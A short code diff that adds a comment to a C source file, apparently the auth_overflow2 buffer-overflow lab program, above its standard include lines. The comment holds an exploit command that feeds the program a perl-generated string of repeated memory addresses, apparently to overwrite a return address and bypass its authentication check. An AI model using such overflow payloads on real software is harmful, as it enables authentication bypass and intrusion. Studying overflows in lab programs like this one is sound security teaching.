@@ -1,3 +1,5 @@
+/* ./auth_overflow2.out $(perl -e 'print "\xa5\x48\x55\x55\x55\x55\x00\x00"x5') */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
